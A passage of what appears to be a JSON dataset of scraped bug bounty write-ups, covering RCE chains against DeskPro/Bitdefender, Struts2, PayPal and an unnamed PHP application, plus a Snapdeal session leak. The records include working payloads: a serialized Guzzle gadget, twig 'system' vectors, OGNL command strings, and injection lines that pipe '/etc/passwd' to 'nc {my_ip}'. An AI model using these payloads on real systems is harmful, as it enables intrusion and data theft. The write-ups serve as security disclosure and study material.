simple API key exposure led to the complete takeover of an AI assistant in production. This eye-opening security analysis reveals the critical vulnerabilities lurking in AI-powered applications and offers essential insights for developers and security professionals. Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... BugBounty POC 0 Read More January 26, 2020 by MuhammadKhizerJaved Improper Input Validation | Add Custom Text and URLs In SMS send by Snapchat | Bug Bounty POC Hey guys so this blog post is about an Issue in Snapchat’s Website, due to Improper Input Validation one can add custom text & urls in SMS send by Snapchat... Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... BugBounty POC 1 Read More Security Breached Blog © 2025. All Rights Reserved. Powered by WordPress . Theme by Alx . Loading Comments... Write a Comment... Email (Required) Name (Required) Website %d"}
{"source_url": "http://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html", "title": "Redirecting...", "friendly_explanation": "This is a bug bounty writeup from http://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nRedirecting..."}
{"source_url": "https://blog.redforce.io/attacking-helpdesks-part-1-rce-chain-on-deskpro-with-bitdefender-as-case-study/", "title": "Attacking HelpDesks Part 1: RCE Chain on DeskPro, with Bitdefender as a Case Study – Redforce", "friendly_explanation": "This is a bug bounty writeup from https://blog.redforce.io/attacking-helpdesks-part-1-rce-chain-on-deskpro-with-bitdefender-as-case-study/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAttacking HelpDesks Part 1: RCE Chain on DeskPro, with Bitdefender as a Case Study – Redforce Always Stay Ahead! Home Categories Web Security Mobile pentest About us About us Our team Our services Get in! Share stories that are meaningful to you and connect with your audiences. Click to sign in/sign up Web Security • March 28, 2020 • 15 min read Attacking HelpDesks Part 1: RCE Chain on DeskPro, with Bitdefender as a Case Study We decided to look at the most popular on-premise helpdesk solutions. In this article we explain how we managed to find and exploit multiple vulnerabilities that eventually lead to remote code execution (RCE) at DeskPro software utilized by thousands of organizations using Bitdefender and Freelancer Inc in a case study. No full exploit is currently available, but steps can be easily reproduced and used to build one. 83 0 Tweet Share TL;DR. Table of Contents Toggle TL;DR. Preface About DeskPro Vulnerability Details 1. Insufficient Access Control at Multiple API endpoints /api/apps/* – (CVE-2020-11465) /api/email_accounts – (CVE-2020-11463) /api/tickets – (CVE-2020-11466) /api/people – (CVE-2020-11464) 2. Insecure Deserialization to RCE in Template Editing Feature (Needs Admin Privilege) [CVE-2020-11467] How to Identify Passively? Now.. Time for Fun Part.. Exploitation! 1. Retrieving Limited User API Token 2. Compromising JWT Authentication 3. Getting Administrative Access to Helpdesk 4. Executing Arbitrary Code on Bitdefender Helpdesk [UPDATE] Real Impact Bitdefender and DeskPro Response What’s Next? We decided to look at the most popular on-premise helpdesk solutions. In this article we explain how we managed to find and exploit multiple vulnerabilities that eventually lead to remote code execution (RCE) at DeskPro software utilized by thousands of organizations using Bitdefender and Freelancer Inc in a case study. No full exploit is currently available, but steps can be easily reproduced and used to build one. Preface A helpdesk is now a crucial part of any company’s online presence. With much sensitive information exchanged between agents and clients, it makes it the perfect target for an adversary targeting the organization. In September 2019, we decided to have a look at some of the most popular open-source helpdesk solutions. Between cloud and on-premise, we preferred to focus on self-hosted solutions because the risks accompanied with them extend beyond data breach to potential internal network infiltration. So, we chose on-prem versions of DeskPro , osTicket and Kayako (We also did “PHP Live!” as a plus for a client) and will present our principal findings in this and the upcoming articles. About DeskPro As defined by them Deskpro is a helpdesk software solution that helps companies manage their communication with their customers and user base across a multiple channels; email, live chat, voice, social media DeskPro has clients in different industries. Some of the well-known names per their website are: Microsoft, Siemens, P&G, Vodafone, HMRC, CapitalOne, Panasonic, NHS, Valve, Brown University, Hotel Chocolat, Garmin, Team USA, Arrow, Pure, Xerox, 1&1, Booz Allen Hamilton, Bitdefender, US Department of Defense and more. The last published CVE/exploit for DeskPro was in 2007 and last (and only) security advisory on their current website was in 2015. This meant that either this application is robust or overlooked. So we took the challenge and we decided to see for ourselves. Vulnerability Details Since we have much to present and this article is already getting long, we decided to keep the upcoming parts focused on the discovered vulnerabilities themselves rather than the motivation and paths used to find them, if anyone is interested, please let us know in the comments. 1. Insufficient Access Control at Multiple API endpoints DeskPro shows high degree of automation and integration through API interfaces that enable developers to build apps that interact with different components of the system. However, multiple API endpoints were found to have a problem properly validating user’s privilege, giving a normal user arbitrary unauthorized access to various actions and information. The following table shows the most important ones /api/apps/* – (CVE-2020-11465) Controlling/installing helpdesk applications, leaking current applications’ configurations, including applications used as user sources (used for authentication) such as JWT . This enables an attacker to forge valid authentication models that resembles any user on the system (Privilege Escalation) /api/email_accounts – (CVE-2020-11463) Retrieve plaintext credentials of all helpdesk email accounts, including incoming and outgoing email credentials /api/tickets – (CVE-2020-11466) Retrieve sensitive information about all helpdesk tickets stored in database with numerous filters. Additionally, it leaks ticket auth code, making it possible to make changes to the ticket /api/people – (CVE-2020-11464) Retrieve sensitive information about all users’ registered on the system. This includes their full name, privilege, email address, phone number…etc. (will be of a good use in our attack scenario) 2. Insecure Deserialization to RCE in Template Editing Feature (Needs Admin Privilege) [CVE-2020-11467] DeskPro enables administrators to modify helpdesk interface by editing theme templates and uses TWIG as its template engine. While direct access to self , _self variables was not permitted, we could abuse the accessible variables in our context to reach PHP’s native unserialize function where we passed our crafted payload to trigger a set of POP gadgets in order to achieve remote code execution. How to Identify Passively? There is nothing cooler than launching a mass scanner hacking the world, while you are chilling out enjoying your favorite movie on Netflix 😀 Luckily, this one is easy to deploy, because DeskPro gives you detailed information about current version deployed under the following API call “ /api/v2/helpdesk/discover “. So with a simple unauthenticated GET request, if you find “ build_name” less than “ 2019.8.0 “, it is probably your lucky day. Now.. Time for Fun Part.. Exploitation! So the plan goes as follow, register a normal guest account (self-registration enabled by default), leak JWT secret, login as administrator, trigger deserialization and voila… server compromised! Bitdefender Support Center (support.bitdefender.com) is using Deskpro. So, we will use it as the case study in this article. But first I would like to give Bitdefender team a big shoutout for their awesome response. Although this issue affects a third-party product, they have deployed a temporary fix within hours and fixed the whole thing (in coordination with DeskPro team) in less than 24 hours and they have been cool enough to allow us to publish this article. The reason we chose Bitdefender is that through our experience with their bug bounty program, they have always been friendly, highly responsible, and actively encouraging security research to enhance their security posture. So let’s begin! 1. Retrieving Limited User API Token In order to establish our attack, we need a valid user account, which we can easily obtain via self-registration at https://support.bitdefender.com/en/register . After activating user’s account, we can request access token by sending username and password to the following API endpoint (https://support.bitdefender.com/api/v2/api_tokens) as shown below 2. Compromising JWT Authentication Note: Any further requests to API interface would require Authorization header to be set to base64 value of the retrieved API token as shown in the following steps DeskPro has a set of built-in applications that can be used for authentication, one of them is JWT app identified by deskpro_us_jwt . As a quick reminder for those who are not much familiar with JWT, it can be regarded as a method for representing claims (such as user identity). To ensure data integrity and security, they are usually signed with a secret key which can be used to validate provided claims. You can find more information here . So, if JWT authentication is enabled and we have this key, we can authenticate to the application as any user. Due to access-control vulnerability within DeskPro, normal user’s could access API endpoints responsible for applications including JWT. Which means, a simple GET request to “https://support.bitdefender.com/api/apps/packages/deskpro_us_jwt?usersource_type=user” with normal user privilege, would leak JWT secret. In Bitdefender case, JWT authentication was not enabled. However, we managed to enable it by issuing PUT request to the same endpoint as shown below PUT /api/apps/packages/deskpro_us_jwt?usersource_type=user HTTP/1.1 Host: support.bitdefender.com Authorization: Basic <redacted> Content-Type: application/json Content-Length: 269 {\"settings\":{\"sso_type\":\"none\",\"auto_agent\":true,\"dp_app\":{\"title\":\"JSON Web Token (JWT)\"},\"actions\":[],\"enable_usersource\":true,\"url\":\"https://www.google.com\",\"secret\":\"V3ryS3cr3tK3y\",\"algo\":\"HS256\",\"login_custom_text\":\"Login\",\"logout_agent_url\":\"https://www.google.com\"}} We can confirm that user source is now available by sending GET request to the same endpoint. We identify usersource id from the following screenshot 3. Getting Administrative Access to Helpdesk To be able to forge a valid administrator JWT token, we need to know administrator’s email. Instead of guessing or bruteforcing our options, we utilized another broken access-control issue at “https://support.bitdefender.com/api/people?is_agent=1” endpoint which brought back to us a list of all system agents and administrators. Administrators had the flag can_admin set to true After retrieving administrator’s email, knowing the secret key of JWT authentication app, we managed to forge a valid JWT token and authenticate to the application using the following URL https://support.bitdefender.com/login/authenticate-callback/6?jwt=<redacted> 4. Executing Arbitrary Code on Bitdefender Helpdesk Now with administrative access, we can trigger deserialization vulnerability that exists in theme editing feature. All we need to prepare is a proper POP gadget to achieve code execution. After we have discovered the gadget chain in Guzzle library, we found out that it was already known and published in ambionics’ awesome tool PHPGGC , so shoutout for them and @proclnas for the awesome work. So, generate the serialized object using PHPGGC (we choose a minimal PoC that executes phpinfo() ) and edit application’s templates to contain your payload and deserialize it as shown in the following request PUT /portal/api/style/edit-theme-set/template-sources HTTP/1.1 Host: support.bitdefender.com Cookie: <redacted> Content-Type: application/json Content-Length: 564 {\"template\":\"Theme::layout.html.twig\",\"code\":\"{% set p = 'O:24:\\\"GuzzleHttp\\\\\\\\Psr7\\\\\\\\FnStream\\\":2:{s:33:\\\"\\\\x00GuzzleHttp\\\\\\\\Psr7\\\\\\\\FnStream\\\\x00methods\\\";a:1:{s:5:\\\"close\\\";a:2:{i:0;O:23:\\\"GuzzleHttp\\\\\\\\HandlerStack\\\":3:{s:32:\\\"\\\\x00GuzzleHttp\\\\\\\\HandlerStack\\\\x00handler\\\";s:1:\\\"1\\\";s:30:\\\"\\\\x00GuzzleHttp\\\\\\\\HandlerStack\\\\x00stack\\\";a:1:{i:0;a:1:{i:0;s:7:\\\"phpinfo\\\";}}s:31:\\\"\\\\x00GuzzleHttp\\\\\\\\HandlerStack\\\\x00cached\\\";b:0;}i:1;s:7:\\\"resolve\\\";}}s:14:\\\"_fn___toString\\\";a:2:{i:0;r:4;i:1;s:7:\\\"resolve\\\";}}' %} {{var_dump(app.getUser().unserialize(p))}}\"} Now, navigate to preview page to trigger your payload (https://support.bitdefender.com/admin-preview-1/new-ticket) as shown below After reaching this point, we reported our findings to Bitdefender and did not attempt to do any lateral movement. [UPDATE] Mahmoud Gamal (@Zombiehelp54) brought to our attention another way that can be used to achieve remote code execution (RCE) via twig template injection. It was even part of VolgaCTF 2020 Qualifier challenge. Apparently, using any of the following vectors lead to executing system commands. {{ app.request.query.filter(0,'whoami',1024,{'options':'system'}) }} {{['whoami']|filter('system')}} We have tested both vectors on the latest stable version and it works like a charm. Real Impact Since most -if not all- helpdesk instances enable self-registration (because, well… it is a helpdesk for “customers”), the vulnerability enables a remote attacker to fully compromise helpdesk instance. This includes all information exchanged between agents and clients which usually contain very sensitive information and PII. Moreover, application configurations and secret keys are leaked (e.g. JIRA API integration public and private keys) . An attacker can also reach company’s intranet and use this helpdesk instance as a pivot point to infiltrate corporate network. Bitdefender and DeskPro Response Bitdefender took the issue very seriously and applied full patches in less than 24 hours which was quite remarkable given that the vulnerable code was in a third-party product. So a big shoutout to them and DeskPro team for fast response. DeskPro has released a security advisory regarding this issue on their website (https://support.deskpro.com/en/news/posts/deskpro-security-update-2019-09) but they failed to mention the remote code execution warning, we tried to contact them several times in this regard but we have not heard back from them. Bitdefender also rewarded us with $5,000 USD as part of their bug bounty program. So thanks for this as well :). What’s Next? In the upcoming articles we will talk about other remote code execution vulnerabilities we discovered in osTicket and Kayako. So go update your systems and get ready to hack the world! Bugbounty DeskPro Helpdesk Information Security Keep reading More > Windows authentication attacks part 2 – kerberos Kerberos authentication is one of the cores of the AD, knowing how it works facilitates the deep understanding of many attacks. Active directory Red teaming • April 28, 2020 • 84 min read Windows authentication attacks – part 1 In order to understand attacks such as Pass the hash, relaying, Kerberos attacks, one should have pretty good knowledge about the windows Authentication / Authorization process. That’s what we’re going to achieve in this series. In this part we’re discussing the different types of windows hashes and focus on the NTLM authentication process. Red teaming • April 2, 2020 • 26 min read Oh, My Kerberos! Do Not Get Kerberoasted! Part of an upcoming series trying to shed the light on attacks targeting Microsoft Kerberos implementation in Active Directory … Active directory Red teaming • April 9, 2019 • 15 min read Comma is forbidden! No worries!! Inject in insert/update queries without it A writeup regarding exploiting SQL injection issue in an insert query while it wasn’t possible to use a comma at my payload at all. Web Security • March 31, 2019 • 13 min read SHAREit Multiple Vulnerabilities Enable Unrestricted Access to Adjacent Devices’ Files Two recently discovered vulnerabilities affecting SHAREit Android application <= v 4.0.38. The first one allows attacker to bypass SHAREit device authentication mechanism, and the other one enables authenticated attacker to download arbitrary files from user's device. Both vulnerabilities were reported to the vendor and patches have been released. Mobile Penetration Testing • February 25, 2019 • 17 min read [SQLi] Extracting data without knowing columns names Extracting data without knowing columns names from MYSQL < 5 or in case of WAF blacklisting sending information_schema in the request Web Security • February 9, 2019 • 7 min read Who are we RedForce is an information security consultancy firm consists of a team of experts in the offensive security field. We are a service-oriented organization specialized in offensive consultancy services . . . more Contact us Address : 5th Floor, Golden Mall, 6th Of October, Giza, Egypt. Phone : +20 100 7842 224 Email : [email protected] Redforce © Copyright 2025. All rights reserved."}
{"source_url": "https://medium.com/@logicbomb_1/bugbounty-how-i-was-able-to-bypass-firewall-to-get-rce-and-then-went-from-server-shell-to-get-783f71131b94", "title": "#BugBounty — How I was able to bypass firewall to get RCE and then went from server shell to get root user account! | by Avinash Jain (@logicbomb) | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@logicbomb_1/bugbounty-how-i-was-able-to-bypass-firewall-to-get-rce-and-then-went-from-server-shell-to-get-783f71131b94. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n#BugBounty — How I was able to bypass firewall to get RCE and then went from server shell to get root user account! | by Avinash Jain (@logicbomb) | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in #BugBounty — How I was able to bypass firewall to get RCE and then went from server shell to get root user account! Avinash Jain (@logicbomb) 5 min read · Apr 29, 2018 -- 5 Listen Share Hi Guys, This vulnerability blog is about when Apache struts2 CVE-2013–2251 went viral and was getting highly exploited because of the impact of vulnerability which was leading to execution of remote commands. In short it was — A vulnerability introduced by manipulating parameters prefixed with “action:”/”redirect:”/”redirectAction:” allows remote command execution in the java web application using < Struts 2.3.15 as a framework. Now when this loophole went viral, major application firewall companies started updating their rule engines and detection technique in order to prevent it from happening which was a pretty obvious and responsible thing. But I was not only able to bypass the firewall and get the remote code execution but also able to get the shell of the server and that too as root user by exploiting kernel CVE. :) Let’s see what was the complete hack — This comes when I was testing for a travel booking website. As it was very clear in order to find whether the application is running over vulnerable Apache Struts framework , you have to simply check for the following vulnerable parameters — “action, redirect,redirectAction” and for the right payload, I google’d a little (as for this, I have to construct an OGNL expression) and this helped me a lot- http://blog.opensecurityresearch.com/2014/02/attacking-struts-with-cve-2013-2251.html , below is the payload used to run the command “ifconfig” redirect:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{‘ ifconfig’})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(‘com.opensymphony.xwork2.dispatcher.HttpServletResponse’),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()} Press enter or click to view image in full size OGNL Expression to run command but as expected , it was blocked by the application firewall , and redirected me to a bots page- Press enter or click to view image in full size Blocked by Application Firewall- Redirected to Bots page and when anything like this happens to me, I always return to the basics. So as pointed out earlier, I knew that which all parameters were vulnerable and one of them was “redirect” which I used in the above request. “Redirect” , yes you felt it right , let’s try for some redirection here and I simply put redirect:http://www.goal.com - Press enter or click to view image in full size redirect request and as you can see I got 302 redirection to location”http://www.goal.com :) and so my earlier “ifconfig” payload got blocked and this redirection worked , this gave an idea to bypass the firewall and so , I combined both the above payload- redirect:http://www.goal.com/${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{‘ ifconfig’})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(‘com.opensymphony.xwork2.dispatcher.HttpServletResponse’),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()} and fired the request- Press enter or click to view image in full size Time for some cheer as I was able to bypass the firewall and got the “ifconfig” command output running :) Press enter or click to view image in full size ifconfig command output Now the next target was to get the remote shell of the server and I tried it using reverse ssh tunneling and public key authentication which allow SSH users to login in without entering passwords. For this I had to put my attacker server ssh public key in the victim server’s authorization list ~/.ssh/authorized_keys. in order to prove the identity and as this going to be a reverse ssh tunnel , I had to add id_rsa.pub key of the victim ssh server as well. In order to define the concept of above 2 keywords in short and understand the concept of public key authentication — id_rsa.pub is a public key that you add to other hosts' authorized_keys files to allow you to log in as that user. authorized_keys is a list of public keys that are allowed to log into that specific account on that specific server. 1st Step- Cat the id_rsa.pub file of the victim server using RCE Press enter or click to view image in full size id_rsa.pub file 2nd Step- Copy the authorized_keys from victim server to attacker server Press enter or click to view image in full size Copy the authorized_keys from victim server to attacker server 3rd Step- Copy back the modified authorized_keys from attacker server to victim which I got by reading id_rsa.pub Press enter or click to view image in full size Copy back the modified authorized_keys from attacker server to victim Now the final step — SSH using the reverse tunnel on attacker machine so I ran the command- Press enter or click to view image in full size SSH using reverse tunnel Pheww! Able to reach to the remote shell of server. :) but I was not logged in as a root that means I could have only limited right and access to files and commands. Now in order to logged in as root user, firstly I found out what was the current kernel version running on victim machine and it was - Press enter or click to view image in full size kernel version So the kernel version found to be 2.6.32 which I google’d in order to find if there was any open CVE against this and to my luck, I found that it was vulnerable to privilege escalation and exploit was over github too — https://github.com/realtalk/cve-2013-2094 . Without wasting much time, I ran the exploit. Press enter or click to view image in full size Running the exploit and finally I was able to get privilege escalation to the root user! :) and this is how the chain to get the remote shell of the server as a root user by exploiting apache strut 2 vulnerability and kernel version exploit ends. Thanks to Kunal Aggarwal for all the mutual efforts! Thanks for reading! ~ Logicbomb ( https://twitter.com/logicbomb_1 ) Hacking Ethical Hacking Bug Bounty Penetration Testing Information Security -- -- 5 Written by Avinash Jain (@logicbomb) 4.99K followers · 230 following Security Engineer @Microsoft | DevSecOps | Speaker | Breaking stuff to learn | Featured in Forbes, BBC| Acknowledged by Google, NASA, Yahoo, UN etc Responses ( 5 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://artsploit.blogspot.com/2016/01/paypal-rce.html", "title": "Artsploit: [manager.paypal.com] Remote Code Execution Vulnerability", "friendly_explanation": "This is a bug bounty writeup from https://artsploit.blogspot.com/2016/01/paypal-rce.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nArtsploit: [manager.paypal.com] Remote Code Execution Vulnerability Artsploit get shell or die trying Monday, January 25, 2016 [manager.paypal.com] Remote Code Execution Vulnerability In December 2015, I found a critical vulnerability in one of PayPal business websites ( manager.paypal.com ). It allowed me to execute arbitrary shell commands on PayPal web servers via unsafe JAVA object deserialization and to access production databases. I immediately reported this bug to PayPal security team and it was fixed promptly. Details While testing manager.paypal.com application, I noticed an unusual post form parameter “oldFormData” that looks like a complex object after base64 decoding: The following research showed that it is a Java serialized object without any signature. It means you can send a serialized object of any existing class to the server, and the “readObject” (or “readResolve” ) method of that class will be called. For exploitation, you need to find a suitable class in the application “classpath” which can be serialized and has something interesting (from exploitation point of view) in the “readObject” method. You can read about this technique in the recent article by FoxGlove Security . A year ago, Chris Frohoff (@frohoff) and Gabriel Lawrence (@gebl) did a great job and found suitable classes in Commons Collections library that could lead to remote code execution. They also published the “ysoserial” payload generation tool on their github page . Exploit I downloaded this tool and generated a simple payload that sends DNS and HTTP requests to my own server by executing the “curl x.s.artsploit.com/paypal” shell command. Then I sent the base64 encoded payload in the “oldFormData” parameter to the application server and was impressed by an incoming request from the PayPal network that appeared in my NGINX access log: I realized that I could execute arbitrary OS commands on the web servers of manager.paypal.com, establish a back connection to my own Internet server and, for example, upload and execute a backdoor. As a result, I could get access to production databases used by the manager.paypal.com application. Instead, I just read “/etc/passwd” file by sending it to my server as a proof of the vulnerability : I also recorded a video how to reproduce this vulnerability and reported it to the PayPal security team. Later, I found out that many other endpoints of the manager.paypal.com application also use serialized objects and can be exploited as well. In a month, my report received a Duplicate status because another researcher, Mark Litchfield, reported a similar vulnerability two days earlier than I did (on December 11, 2015). PayPal decided to pay me a good bounty anyway, and I have nothing but respect for them. Demo Posted by Michael Stepankin at 1:05:00 AM Email This BlogThis! Share to X Share to Facebook Share to Pinterest Labels: #bugbounty , #paypal , #RCE Newer Post Home Whoami Michael Stepankin @artsploit artsploit [at] gmail.com https://github.com/artsploit/ https://portswigger.net/research/michael-stepankin Popular Posts [demo.paypal.com] Node.js code injection (RCE) When I am trying to find vulnerabilities in web applications, I always perform fuzzing of all http parameters, and sometimes it gives me som... [manager.paypal.com] Remote Code Execution Vulnerability In December 2015, I found a critical vulnerability in one of PayPal business websites ( manager.paypal.com ). It allowed me to exe... 3 ways to get Remote Code Execution in Kafka UI When I first encountered Kafka UI, I was thrilled that such a dangerous functionality is exposed without authentication. After some time I d... mTLS: When certificate authentication is done wrong https://github.blog/2023-08-17-mtls-when-certificate-authentication-is-done-wrong/ In 2023 I spent some time researching x509 certificate au... Hidden OAuth attack vectors https://portswigger.net/research/hidden-oauth-attack-vectors I wrote this article while working at the PortSwigger Research team. Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464) https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464 I wrote this article while working at the PortSwigger Rese... Exploiting JNDI Injections in Java https://www.veracode.com/blog/research/exploiting-jndi-injections-java I wrote this article while working at the Veracode Research team. Spring View Manipulation Vulnerability https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability I wrote this article while working at the Veracode ... Exploiting Spring Boot Actuators https://www.veracode.com/blog/research/exploiting-spring-boot-actuators I wrote this article while working at the Veracode Research team. Apache Solr Injection @ DEFCON 27 https://github.com/veracode-research/solr-injection A brand new vulnerability - Apache Solr Injection , as well as new ways to RCE in this ... Blog Archive ► 2024 (1) ► October (1) ► 2023 (1) ► August (1) ► 2021 (2) ► June (1) ► March (1) ► 2020 (1) ► September (1) ► 2019 (3) ► August (1) ► February (1) ► January (1) ▼ 2016 (2) ► August (1) ▼ January (1) [manager.paypal.com] Remote Code Execution Vulnera... Labels #bugbounty #paypal #RCE Powered by Blogger ."}
{"source_url": "https://medium.com/@uranium238/getting-a-rce-ctf-way-2fd612fb643f", "title": "Getting a RCE — CTF Way. Recently I was invited to a private… | by Uranium238s | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@uranium238/getting-a-rce-ctf-way-2fd612fb643f. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nGetting a RCE — CTF Way. Recently I was invited to a private… | by Uranium238s | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Getting a RCE — CTF Way Uranium238s 4 min read · Dec 5, 2017 -- 1 Listen Share Recently I was invited to a private program of a company. As a fresh start, I decided to look around and see what I could find. This company, required that I verify my account with some confidential information so I reached out to their sec engineers and team on how this could be done. Once the verification was done by adding some fake data, I moved onto to find some severe vulnerability. One of them was a RCE on their server. Most of the details here will be a redacted version to keep confidential information, private. When I first started in this app, I knew they were vulnerable for RCE. Gut feeling combined with some recon gave me the feeling that I could get a RCE. It was just a matter of where and how. Like I always do, I played with the app for a while and made a list of features that could have this vulnerability. For example file upload was something that was in top of my list. I tried some steps to upload php or even html to just see if I could upload a file. Unfortunately, it was pretty tight in security on file uploads so I decided to move on. After that I moved onto another endpoint, lets call this endpoint_lvl1 . This was used to send some request to another vendor to buy some product. It needed the price of the product and the user id. This was likely using an API or some form of request. In PHP you can do this multiple ways. curl request, simple api request and many more. I have basic experience of PHP so I decided to layout / program possible source code for that part. This way I could visualize the code as it happened. The request was sending my product price and user id. And in result, it will either result something like Successfully bought the product and reduce the balance from the account or it would say something like I could not get the user account. If you don't have a user account on this vendor, create one please . When there was no response form the vendor’s server, it sent a 500 Internal server error. Now comes the part of CTF hunting. The recon that I had done before had confirmed that they had RCE and it should not be hard to find. So if this was the endpoint that was vulnerable to RCE then there should not be much work needed. I also noticed that while other things might change, the length of user id was always the same. If it was less than that, it would send an error asking user to Put a valid user id . Now because we know this uses PHP and because this is vulnerable to RCE, I had to eliminate some option. API would be hard to get RCE with unless there was some really shady stuff going on there. So I went with sth that no one could have possibly thought of : Curl file_get_contents and if it is really vulnerable how about having a shell_exec() or system() I went to test with each and everyone of it. I created a local instance on my server, creating vulnerable PHP with each types to get RCE, that way I tried a small payload to see how it works for each. Curl and file_get_contents did not work. shell_exec() kept bugging me on how it could potentially work. Along with that, there were some more behaviors that stood out. Exploit: During the analysis of the application, as previously stated, when a product was bought, an external call was made. However this request never showed up on Burp. This was interesting and because this was php, I thought it could be something like: shell_exec('curl {website with request}') . This way the request will never go to burp and the system will be able to run the cURL request. So a sample code will have an activity like this: User enters the ID which will be used to buy the product The ID is then sent to external website in format like this: shell_exec('curl -X POST -d \"strCommand=GETUSERINFO'.'&strParam1='.'|user='.$_POST['user_id'].'|\" '.$url.' -k'); The ID was supposed to be 7 character longs but they did not check if the ID was an int or a string and simply checked the first character to deduce that it was an int so if we simply have 1xxxxxx then we would bypass that. So now with a sample request that could look like something above, I sent a payload: 1xxxxxxxxxx`sleep 5` . This payload will bypass the string check and at the same time, allow me to run a command through shell_exec(). Once the request was sent, there was a delay of 5 seconds. Next, I sent: 1xxxxxxxxxxxxx`id | nc {my_ip} 80` and the server successfully received the server user id which could be something like this: uid=0(root) gid=0(root) groups=0(root) . After that, I launched a request for /etc/passwd and got its content as well with this payload: 1xxxxxxxxxxxxx`cat /etc/passwd| nc {my_ip} 80` Timeline: (Date and time are from h1 system) July 3, 2017 03:37:23-Report submitted July 3, 2017 03:47:20-Report Triaged July 3, 2017 03:58:44-A pretty detailed writeup about how this work was sent July 8, 2017 — Vulnerability Fixed Hackerone Bug Bounty -- -- 1 Written by Uranium238s 468 followers · 7 following Security Researcher @ Hacker0x01. I like to help the society be safe and better. https://twitter.com/uraniumhacker Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@nanda_kumar/bugbounty-how-snapdeal-indias-popular-e-commerce-website-kept-their-user-data-at-risk-3d02b4092d9c", "title": "#BugBounty — How Snapdeal (India’s Popular E-commerce Website) Kept their Users Data at Risk! | by Nanda Kumar | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@nanda_kumar/bugbounty-how-snapdeal-indias-popular-e-commerce-website-kept-their-user-data-at-risk-3d02b4092d9c. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n#BugBounty — How Snapdeal (India’s Popular E-commerce Website) Kept their Users Data at Risk! | by Nanda Kumar | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in #BugBounty — How Snapdeal (India’s Popular E-commerce Website) Kept their Users Data at Risk! Nanda Kumar 2 min read · Dec 19, 2019 -- 1 Listen Share Press enter or click to view image in full size Hi Guys, This is my first blog after doing some bug-bounty for few months. This blog illustrates how I was able to access the user's data of snapdeal without their knowledge and interaction. While I was shopping on snapdeal website and during checkout, I came to a thought that — IS THIS IS SAFE TO ENTER YOUR DATA . That is how I started to do some recon and content discovery in snapdeal and I discovered an endpoint “ https://www.snapdeal.com/monitoring ”. So let’s not waste more time and get started how do I able to access snapdeal users account. Press enter or click to view image in full size Insecure Storage of Sensitive Information(CWE-922) In that web directory, I started fuzzing with every link and option I see without realizing that it as cookies itself for the active users in the View Http Sessions. Press enter or click to view image in full size Active sessions Next what enter into anyone sessions and stole their cookies and start messing with their cookies. Intercept the request of your logged-in account in the burp suite and change the username & cookies of your account to anyone. And voila I successfully get complete access to anyone's account. Press enter or click to view image in full size Successful access to anyone account Report Details: Type of Bug: Insecure Storage of Sensitive Information(CWE-922) Timeline : 12-Dec-2019: Notified the snapdeal team in the mail but no reply. 19-Dec-2019: Notified the snapdeal team on twitter and later that day vulnerability got fixed. Thanks for reading! India Bug Bounty Infosec Penetration Testing Ethical Hacking -- -- 1 Written by Nanda Kumar 30 followers · 348 following Security Researcher Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@abhishake100/my-first-rce-stressed-employee-gets-me-2x-bounty-c4879c277e37", "title": "My First RCE (Stressed Employee gets me 2x bounty) | by Abhishek | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@abhishake100/my-first-rce-stressed-employee-gets-me-2x-bounty-c4879c277e37. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMy First RCE (Stressed Employee gets me 2x bounty) | by Abhishek | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in My First RCE (Stressed Employee gets me 2x bounty) Abhishek 4 min read · Jan 10, 2020 -- 2 Listen Share This was an easy find tbh, but since it was my first and a weird one i would like to share. Press enter or click to view image in full size Curated list of Bug Bounty programs — https://bugbountydirectory.com I had found multiple bugs on the website before (like open redirect, hyperlink Injection, etc) but recently they updated the whole layout of the website and so i thought to look at it again. Browsing the website i found the file upload functionality to update the profile which wasn’t there before, so i uploaded a svg image and i got XSS. Press enter or click to view image in full size I reported it them and i kid you not they 